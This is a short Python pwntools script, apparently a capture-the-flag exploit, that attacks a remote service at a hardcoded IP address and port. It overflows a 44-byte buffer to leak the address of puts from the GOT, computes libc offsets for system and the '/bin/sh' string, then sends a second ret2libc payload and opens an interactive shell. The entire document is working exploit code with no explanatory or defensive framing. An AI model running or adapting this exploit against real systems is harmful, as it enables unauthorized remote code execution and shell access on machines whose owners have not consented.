from pwn import *

offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_dup2 = 0x000d9dd0
offset_read = 0x000d9490
offset_write = 0x000d9510
offset_str_bin_sh = 0x15da84
offset_puts = 0x64c10

got_puts = 0x804a018
'''$ readelf -r ./23e4f31a5a8801a554e1066e26eb34745786f4c4 | grep puts
0804a018  00000407 R_386_JUMP_SLOT   00000000   puts'''


addr_main = 0x804851d

pop_ret = 0x0804839d

pad = 'A'*44

payload = pad + p32(0x080483e6) + p32(pop_ret) + p32(got_puts) + p32(addr_main) + p32(addr_main)
s = remote('130.211.202.98',7575)

s.recvline()
s.sendline(payload)

s.recvline()
s.send("1\n")
s.recvline()

t=s.recv(4)
puts_leak=u32(t)
s.recvline()


payload1 = pad + p32(puts_leak - offset_puts + offset_system) + p32(pop_ret) + p32(puts_leak - offset_puts + offset_str_bin_sh)

s.sendline(payload1)
s.interactive()